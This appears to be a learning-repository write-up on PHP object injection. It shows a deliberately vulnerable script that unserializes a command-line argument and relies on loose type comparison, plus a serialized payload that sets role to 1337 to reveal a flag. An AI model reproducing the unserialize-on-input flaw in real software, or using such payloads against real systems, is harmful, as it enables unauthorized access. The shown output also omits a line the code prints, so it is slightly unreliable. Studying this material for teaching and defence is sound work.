# PHP object injection

This kind of exploit follows the same insight as showed in [PHP Object Injection Example 01](https://github.com/IgorSAssis/learning-exploitation/tree/main/php-object-injection/example-01), but with some conditional flows that do some kind of validation before running the command that will be exploited. The following code will be used to demonstrate this exploit:
```php
<?php
  
  class login {
    public $username = "X-C3LL";
    public $password = "Insanity";
    public $role = "MUGGLE";
  }

  $obj = new login();

  $serialized_obj = serialize($obj);

  echo "Example of a serialized object: \n$serialized_obj\n";
  echo "FLAG: \n";

  $unserialized_obj = unserialize($argv[1]);
  $some_check = $unserialized_obj->role - 1337;

  echo "check: " . $some_check . "\n";

  if ($some_check == "ADMIN") {
    $flag = file_get_contents("flag.txt");
    echo $flag . "\n";
  } else {
    echo "No flag for you! Better luck next time!\n";
  }


?>
```

Basically, the variable ```$some_check``` is beeing compared with "ADMIN" string. If this evaluates to a true statement, then the flag is printed to screen, otherwise "No flag for you! Better luck next time" will be printed. We have under our control the ```$argv[1]``` argument, that is beeing unserialized and immediatelly next is beeing subtracted of 1337.

If somehow we can force the expression ```$some_check == "ADMIN"``` evaluates to true, we will got the flag. In PHP, we have a way to achieve this by the PHP types comparison. The following link contains the full table of comparisons avaliable in PHP [PHP Type Comparison](https://www.php.net/manual/en/types.comparisons.php).

This kind of exploit will only work with versions of PHP prior to 8.0.0.

Our objective is evaluates ```php $some_check == "ADMIN"``` to true. As the type comparison table show us, if we compare some string with a number, the result will be **true**. So, we can just pass the following serialized object as argument of our script:
```bash
    php ex02.php 'O:5:"login":3:{s:8:"username";s:6:"X-C3LL";s:8:"password";s:8:"Insanity";s:4:"role";i:1337;}'
```

And the following output will be displayed:
```plaintext
Example of a serialized object: 
O:5:"login":3:{s:8:"username";s:6:"X-C3LL";s:8:"password";s:8:"Insanity";s:4:"role";s:6:"MUGGLE";}
FLAG: 
HERE_IS_THE_FLAG
```